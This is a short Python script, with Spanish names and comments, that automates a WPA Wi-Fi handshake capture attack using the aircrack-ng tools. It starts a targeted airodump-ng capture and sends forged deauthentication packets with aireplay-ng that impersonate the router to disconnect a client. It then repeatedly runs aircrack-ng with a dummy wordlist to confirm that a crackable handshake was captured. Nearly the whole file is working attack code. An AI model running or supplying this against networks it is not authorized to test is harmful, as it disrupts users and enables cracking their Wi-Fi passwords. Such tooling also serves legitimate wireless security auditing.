import subprocess
import time
import os
import glob
import pty
import tempfile

def iniciar_captura_dirigida(interfaz_monitor: str, bssid: str, canal: str, archivo_salida: str = "captura"):

    for archivo_viejo in glob.glob(f"{archivo_salida}-*"):
        os.remove(archivo_viejo)

    comando = ["sudo", "airodump-ng", interfaz_monitor, "--bssid", bssid, "-c", canal, "-w", archivo_salida]

    maestro, esclavo = pty.openpty()
    proceso = subprocess.Popen(comando, stdout=esclavo, stderr=esclavo, stdin=esclavo, close_fds=True)
    os.close(esclavo)

    return proceso


def desautenticar(interfaz_monitor: str, bssid: str, mac_cliente: str, cantidad_paquetes: int = 15):
    # Envía paquetes de desautenticación falsos al cliente, para forzar la reconexión. Se hace pasar por el router
    

    comando = [
        "sudo", "aireplay-ng",
        "-0", str(cantidad_paquetes),
        "-a", bssid,
        "-c", mac_cliente,
        interfaz_monitor
    ]

    resultado = subprocess.run(
        comando,
        capture_output=True,
        text=True
    )

    print(resultado.stdout + resultado.stderr)
    
def esperar_handshake(archivo_cap: str, bssid: str, intentos_maximos: int = 10, espera_segundos: int = 5) -> bool:

    # Creamos un diccionario temporal falso, solo para forzar a aircrack-ng
    # a revisar de verdad si hay datos EAPOL (handshake), en vez de solo
    # decirnos "dame un diccionario".
    diccionario_temporal = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
    diccionario_temporal.write("clave_de_prueba\n")
    diccionario_temporal.close()

    try:
        for intento in range(intentos_maximos):
            resultado = subprocess.run(
                ["aircrack-ng", "-b", bssid, "-w", diccionario_temporal.name, archivo_cap],
                capture_output=True,
                text=True
            )
            salida = resultado.stdout
            if "Passphrase not in dictionary" in salida or "KEY FOUND" in salida:
                print("¡Handshake capturado!")
                return True
            print(f"Intento {intento + 1}/{intentos_maximos}: aún no hay handshake, esperando...")
            time.sleep(espera_segundos)
        return False
    finally:
        os.remove(diccionario_temporal.name)